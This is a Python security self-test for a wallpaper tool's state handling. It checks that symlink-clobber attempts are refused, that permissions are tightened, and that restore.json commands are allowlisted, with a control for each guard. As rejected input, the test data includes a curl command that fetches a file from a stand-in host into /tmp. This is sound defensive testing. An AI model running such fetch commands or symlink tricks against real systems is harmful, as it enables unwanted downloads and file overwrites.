"""Security self-test for duskpaper's state handling.

    python -m duskpaper.selftest      # exit 0 = pass, 1 = fail

Same idiom as the engines' seam self-tests: no test framework, plain asserts,
runnable from a clean checkout. Every guard here ships with a control that
provably fires, because a guard whose test cannot fail is decoration.
"""

import json
import os
import stat
import tempfile
from pathlib import Path

from . import cli

_results = []


def check(name, cond):
    _results.append(bool(cond))
    print(("ok   " if cond else "FAIL ") + name)


def _mode(p):
    return stat.S_IMODE(os.stat(p).st_mode)


def run():
    with tempfile.TemporaryDirectory() as tmp:
        tmp = Path(tmp)
        original_state = cli.STATE
        try:
            # ── symlinked target file ─────────────────────────────────────────
            cli.STATE = tmp / "state"
            cli.STATE.mkdir(mode=0o700)
            victim = tmp / "important.txt"
            victim.write_text("IMPORTANT USER DATA")
            (cli.STATE / "restore.json").symlink_to(victim)

            wrote = cli._write_state("restore.json", json.dumps([["swaybg"]]))
            check("symlinked-target-refused", wrote is False)
            check("symlinked-target-victim-untouched",
                  victim.read_text() == "IMPORTANT USER DATA")
            check("symlinked-target-link-survives",
                  (cli.STATE / "restore.json").is_symlink())

            # control: the same write on an ordinary path must SUCCEED, or the
            # check above would pass for a function that never writes anything.
            ok = cli._write_state("video", "/some/loop.mp4")
            check("ordinary-path-writes (control)",
                  ok is True and (cli.STATE / "video").read_text() == "/some/loop.mp4")
            check("state-file-is-0600", _mode(cli.STATE / "video") == 0o600)

            # ── symlinked state DIRECTORY ─────────────────────────────────────
            real = tmp / "elsewhere"
            real.mkdir()
            cli.STATE = tmp / "linked-state"
            cli.STATE.symlink_to(real, target_is_directory=True)
            check("symlinked-state-dir-refused",
                  cli._write_state("video", "x") is False)
            check("symlinked-state-dir-wrote-nothing",
                  not (real / "video").exists())

            # ── permissions are TIGHTENED, not merely created ─────────────────
            # Planting 0755 first is the whole point: asserting 0700 on a
            # directory the code just made with mode=0o700 cannot fail, so it
            # would prove nothing about a real install that an earlier build
            # left world-readable.
            cli.STATE = tmp / "loose"
            cli.STATE.mkdir(mode=0o755)
            os.chmod(cli.STATE, 0o755)
            check("loose-dir-really-is-0755 (control)", _mode(cli.STATE) == 0o755)
            cli._prepare_state_dir()
            check("state-dir-tightened-to-0700", _mode(cli.STATE) == 0o700)

            # ── restore.json is an allowlist, not a command runner ────────────
            evil = [["curl", "http://example.com/x", "-o", "/tmp/x"]]
            check("non-daemon-command-dropped", cli.valid_restore_commands(evil) == [])
            check("absolute-path-disguise-dropped",
                  cli.valid_restore_commands([["/usr/bin/curl", "x"]]) == [])
            # control: a real daemon command must SURVIVE, or an allowlist that
            # rejects everything would pass every check above.
            good = [["swaybg", "-i", "/path/bg.png", "-m", "fill"]]
            check("daemon-command-kept (control)",
                  cli.valid_restore_commands(good) == good)

            # ── malformed input must not raise ────────────────────────────────
            for junk in ({"a": 1}, "swaybg", [["swaybg", 7]], [[]], [None], 42, []):
                try:
                    cli.valid_restore_commands(junk)
                except Exception as exc:  # noqa: BLE001
                    check("malformed-input-no-raise: " + repr(junk), False)
                    print("   raised: " + repr(exc))
                    break
            else:
                check("malformed-input-no-raise", True)
        finally:
            cli.STATE = original_state

    failed = _results.count(False)
    print(f"{len(_results)} checks, {failed} failed")
    print("RESULT " + ("FAIL" if failed else "PASS"))
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(run())
